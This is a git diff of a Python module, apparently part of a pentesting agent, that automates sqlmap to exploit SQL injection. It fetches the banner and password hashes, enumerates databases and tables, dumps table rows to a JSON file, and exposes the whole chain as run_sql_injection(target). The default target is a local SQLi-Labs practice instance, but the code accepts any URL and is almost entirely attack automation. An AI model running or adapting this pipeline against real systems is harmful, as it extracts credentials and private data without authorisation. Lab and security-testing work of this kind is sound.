@@ -1,44 +1,25 @@
 import subprocess
 import json
 
-target = "localhost/sqlilabs/Less-1/?id="
-
-
-sqlmap_commands = [f"sqlmap -u {target} --batch --banner",
-                   f"sqlmap -u {target} --batch --passwords",
-                   f"sqlmap -u {target} --batch --dbs",
-                   f"sqlmap -u {target} --batch --tables -D database",
-                   f"sqlmap -u {target} --batch --dump -T table -D database"]
-
-
 common_mysql_dbs = ["information_schema", "mysql", "performance_schema"]
 
+def __get_sql_command(target:str, command_index:int):
 
-'''
-    Retrived data format is:
+    sqlmap_commands = [f"sqlmap -u {target} --batch --banner",
+                       f"sqlmap -u {target} --batch --passwords",
+                       f"sqlmap -u {target} --batch --dbs",
+                       f"sqlmap -u {target} --batch --tables -D database",
+                       f"sqlmap -u {target} --batch --dump -T table -D database"]
 
-    {
-        "target": {target}
-        "DBMS_type": "MySQL",
-        "databases": ["ime", "ime", ...],
-        "table": []
-
-    }
-'''
-
-retrived_data = {
-    "target":f"{target}",
-    "dbms_type": "",
-    "databases":{},
-    "tables":{}
-}
+    return sqlmap_commands[command_index]
 
 
 # Runs shell code to find all databases in the target service.
-def run_find_dbs():
+def __run_find_dbs(target:str):
 
     # Place shell commands in correct format for subproces.run()
-    command_split = sqlmap_commands[2].split(" ")
+    # command_split = sqlmap_commands[2].split(" ")
+    command_split = __get_sql_command(target, 2).split(" ")
 
     # Run SQLMap, store shell output in a variable.
     shell_output = subprocess.run(command_split, capture_output=True, text=True)
@@ -46,7 +27,7 @@ def run_find_dbs():
     return shell_output
 
 # Retrives info such as DBMS type and list of databases.
-def parse_sqlmap_dbs_output(shell_output: str):
+def __parse_sqlmap_dbs_output(shell_output: str):
 
     dbms_type: str
     databases = []
@@ -90,10 +71,11 @@ def parse_sqlmap_dbs_output(shell_output: str):
     return databases, dbms_type
 
 # Runs shell code to find all tables in a given database.
-def run_find_tables(db_name: str):
+def __run_find_tables(target:str, db_name: str):
 
     # Place shell commands in correct format for subproces.run()
-    command_split = sqlmap_commands[3].split(" ")
+    # command_split = sqlmap_commands[3].split(" ")
+    command_split = __get_sql_command(target, 3).split(" ")
 
     # Add database name to SQLMap command.
     command_split[-1] = db_name
@@ -104,7 +86,7 @@ def run_find_tables(db_name: str):
     return shell_output
 
 # Retrives all table names from a given databse.
-def parse_sqlmap_tables_output(shell_output: str):
+def __parse_sqlmap_tables_output(shell_output: str):
 
     tables = []
 
@@ -144,10 +126,11 @@ def parse_sqlmap_tables_output(shell_output: str):
     return list(tables)
 
 # Runs shell code to dump table content.
-def run_table_dump(table_name:  str, db_name: str):
+def __run_table_dump(target:str, table_name:  str, db_name: str):
 
     # Place shell commands in correct format for subproces.run()
-    command_split = sqlmap_commands[4].split(" ")
+    # command_split = sqlmap_commands[4].split(" ")
+    command_split = __get_sql_command(target, 4).split(" ")
 
     # Add database name to SQLMap command.
     command_split[-1] = db_name
@@ -161,7 +144,7 @@ def run_table_dump(table_name:  str, db_name: str):
     return shell_output
 
 #  Retrives 5 rows of a given db table.
-def parse_sqlmap_table_dump_output(shell_output: str):
+def __parse_sqlmap_table_dump_output(shell_output: str):
 
     rows = []
     first_plus = True
@@ -191,15 +174,20 @@ def parse_sqlmap_table_dump_output(shell_output: str):
     return list(rows)
 
 
-# Ovo je primjer kako treba zvat funkcije u agentu.
-if __name__ == '__main__':
+# Function that runs entire SQLinjection exploit.
+def run_sql_injection(target: str):
 
-    print("Pokrecem sqli_utils...\n")
+    retrived_data = {
+        "target":f"{target}",
+        "dbms_type": "",
+        "databases":{},
+        "tables":{}
+    }
 
     # Find all databases.
-    sqlamp_dbs_output = run_find_dbs()
+    sqlamp_dbs_output = __run_find_dbs(target)
 
-    dbs, dbms_type = parse_sqlmap_dbs_output(sqlamp_dbs_output.stdout)
+    dbs, dbms_type = __parse_sqlmap_dbs_output(sqlamp_dbs_output.stdout)
 
     # Store found results in report.
     retrived_data["dbms_type"] = dbms_type
@@ -208,18 +196,18 @@ if __name__ == '__main__':
     # Search all databases for all tables.
     for db in dbs:
 
-        sqlmap_tables_output = run_find_tables(db)
+        sqlmap_tables_output = __run_find_tables(target, db)
 
-        tables_list = parse_sqlmap_tables_output(sqlmap_tables_output.stdout)
+        tables_list = __parse_sqlmap_tables_output(sqlmap_tables_output.stdout)
 
         # Store found tables to report.
         retrived_data["databases"][db] = tables_list
 
         for table in tables_list:
 
-            sqlmap_table_dump_output = run_table_dump(table, db)
+            sqlmap_table_dump_output = __run_table_dump(target, table, db)
 
-            rows_dump = parse_sqlmap_table_dump_output(sqlmap_table_dump_output.stdout)
+            rows_dump = __parse_sqlmap_table_dump_output(sqlmap_table_dump_output.stdout)
 
             # Store first 5 table rows to report.
             retrived_data["tables"][table] = rows_dump
@@ -230,4 +218,9 @@ if __name__ == '__main__':
     with open('dumped.json', 'w') as file:
         json.dump(retrived_data, file, indent=4)
 
-    print(retrived_data)
+    # print(retrived_data)
+
+
+# if __name__ == '__main__':
+#
+#     run_sql_injection("localhost/sqlilabs/Less-1/?id=")
